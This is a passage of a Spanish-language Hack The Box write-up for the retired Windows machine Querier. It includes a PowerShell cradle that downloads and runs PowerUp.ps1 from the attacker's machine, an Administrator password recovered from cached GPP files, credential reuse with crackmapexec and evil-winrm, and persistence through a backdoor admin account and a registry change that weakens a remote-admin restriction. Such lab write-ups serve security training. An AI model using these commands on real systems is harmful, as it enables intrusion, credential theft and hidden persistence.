+<p>Enumeramos un poco, al ver que estamos en un proceso con la misma arquitectura de la maquina victima procedemos a Postear nuestro Script <code class="language-plaintext highlighter-rouge">PowerUp.ps1</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Environment]::Is64BitOperatingSystem
+True
+<span class="o">[</span>Environment]::Is64BitProcess
+True
+</code></pre></div></div>
+
+<p>Maquina Vitctima</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s2">"http://10.10.16.3/PowerUp.ps1"</span><span class="o">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Output</code> de <code class="language-plaintext highlighter-rouge">PowerUp.ps1</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2196
+ProcessId   : 2960
+Name        : 2960
+Check       : Process Token Privileges
+
+ServiceName   : UsoSvc
+Path          : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe <span class="nt">-k</span> netsvcs <span class="nt">-p</span>
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse <span class="nt">-Name</span> <span class="s1">'UsoSvc'</span>
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+
+ModifiablePath    : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+IdentityReference : QUERIER<span class="se">\m</span>ssql-svc
+Permissions       : <span class="o">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span class="o">}</span>
+%PATH%            : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+Name              : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll <span class="nt">-DllPath</span> <span class="s1">'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'</span>
+
+UnattendPath : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
+Name         : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
+Check        : Unattended Install Files
+
+Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>
+UserNames : <span class="s2">"{Administrator} "</span>
+NewName   : <span class="o">[</span>BLANK]
+Passwords : <span class="s2">" {MyUnclesAreMarioAndLuigi!!1!} "</span>
+File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup 
+            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
+Check     : Cached GPP Files
+</code></pre></div></div>
+
+<p>Maquina Atacante - Recibimos la Peticion de Red</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 -m http.server 80   </span>
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.125 - - <span class="o">[</span>26/Jan/2022 20:06:27] <span class="s2">"GET /PowerUp.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Encontramos una Contraseña para el Usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator:MyUnclesAreMarioAndLuigi!!1!
+</code></pre></div></div>
+
+<p>Procedemos a Comprobarlas con Crackmapexec para <code class="language-plaintext highlighter-rouge">SMB</code> y <code class="language-plaintext highlighter-rouge">Winrm</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Aqui no le ponemos el Domino -WORKGROUP y la pass no es valida</span>
+<span class="c"># crackmapexec smb 10.10.10.125 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!'     </span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\a</span>dministrator:MyUnclesAreMarioAndLuigi!!1! STATUS_NO_LOGON_SERVERS 
+                                                                                                                                                                    
+<span class="c"># Aqui le indicamos el dominio -d WORKGROUP </span>
+<span class="c"># crackmapexec smb 10.10.10.125 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP     </span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\a</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+
+<span class="c"># Comprobacion para WINRM</span>
+<span class="c"># crackmapexec winrm 10.10.10.125 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP                                                                                                            1 ⚙</span>
+WINRM       10.10.10.125    5985   10.10.10.125     <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.125:5985/wsman
+WINRM       10.10.10.125    5985   10.10.10.125     <span class="o">[</span>+] WORKGROUP<span class="se">\a</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vale pues procedemos a conectarnos a la maquina con la herramienta <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># evil-winrm -i 10.10.10.125 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!'    </span>
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Sacamos la Flag de <code class="language-plaintext highlighter-rouge">Root.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/root.txt
+b19c3794f786a1fdxxxxxxxxxxxxxxxx
+</code></pre></div></div>
+
+<h1 id="persistencia-a-nivel-de-equipo-una-vez-logrado-ser-administrador">Persistencia a nivel de Equipo una Vez logrado ser Administrador</h1>
+
+<p>Forma 1 – Crear un nuevo usuario y hacerlo administrador</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; net user paco paco123<span class="nv">$ </span>/add
+The <span class="nb">command </span>completed successfully.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; net localgroup paco administrators /add
+net.exe : System error 1376 has occurred.
+    + CategoryInfo          : NotSpecified: <span class="o">(</span>System error 1376 has occurred.:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+The specified <span class="nb">local </span>group does not exist.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; Add-LocalGroupMember <span class="nt">-Group</span> <span class="s2">"Administrators"</span> <span class="nt">-Member</span> <span class="s2">"paco"</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; net user paco
+User name                    paco
+Full Name
+Comment
+Users comment
+Country/region code          000 <span class="o">(</span>System Default<span class="o">)</span>
+Account active               Yes
+Account expires              Never
+
+Password last <span class="nb">set            </span>1/26/2022 7:38:06 PM
+Password expires             3/9/2022 7:38:06 PM
+Password changeable          1/27/2022 7:38:06 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      <span class="s2">"*Administrators"</span>       <span class="k">*</span>Users
+Global Group memberships     <span class="k">*</span>None
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<p>Comprobacion con Crackmapexec para ver si tendriamos el usuario creado y con (Pwned)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.125 -u "paco" -p 'paco123$' -d WORKGROUP</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\p</span>aco:paco123<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que la pass es validad pero no tendriamos posibilidad de conectarnos al no tener el <code class="language-plaintext highlighter-rouge">(Pwned)</code></p>
+
+<p>Puede ocurrir que tengamos credenciales de administrador, pero no tengamos la capacidad de ejecutar comandos.
+Esto puede ocurrir porque <code class="language-plaintext highlighter-rouge">LocalAccountTokenFilterPolicy</code> es un <code class="language-plaintext highlighter-rouge">filtro que previene</code> que se usen <code class="language-plaintext highlighter-rouge">privilegios elevados</code> a través de la <code class="language-plaintext highlighter-rouge">red</code>. 
+Solo <code class="language-plaintext highlighter-rouge">aplicaria</code> para las <code class="language-plaintext highlighter-rouge">Cuentas Administrativas Locales</code>, <code class="language-plaintext highlighter-rouge">No afectan</code> a las <code class="language-plaintext highlighter-rouge">Cuentas de Dominios</code></p>
+
+<p>Para deshabilitar el <code class="language-plaintext highlighter-rouge">LocalAccountTokenFilterPolicy</code>, debemos retocar el siguiente registro</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\s</span><span class="s2">ystem"</span>
+</code></pre></div></div>
+<p>Procemos a hacerlo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\P</span>olicies<span class="se">\s</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+The operation completed successfully.
+</code></pre></div></div>
+
+<p>Recomprobamos con la herramienta Crackmapexec</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># crackmapexec smb 10.10.10.125 -u "paco" -p 'paco123$' -d WORKGROUP</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\p</span>aco:paco123<span class="nv">$ </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="post-explotacion-atraves-de-usuario-nuevo-creado-paco">Post Explotacion atraves de Usuario Nuevo Creado Paco</h1>
+<p>Usando la herramienta <code class="language-plaintext highlighter-rouge">psexec.py</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># psexec.py 'WORKGROUP/paco:paco123$'@10.10.10.125</span>
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file pSzSoFOo.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service SWYm on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service SWYm.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.292]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Maquina Rooteda - Surf3rH4ck - K0H4ck</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2022/01/04/Querier.html';
+     this.page.identifier = '/2022/01/04/Querier';
+     this.page.title = 'Maquina Retirada Querier de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Buff-Bof.html">
+            Maquina  Retirada Buff de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Attacktive-THM-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hacking/" class="set-4">Hacking</a> <a href="/tag/hacking%2C/" class="set-1">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/oscp/" class="set-4">OSCP</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path%2C/" class="set-4">Path,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-1">Web</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-1">Writeup</a> <a href="/tag/writeup%2C/" class="set-4">Writeup,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Querier';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
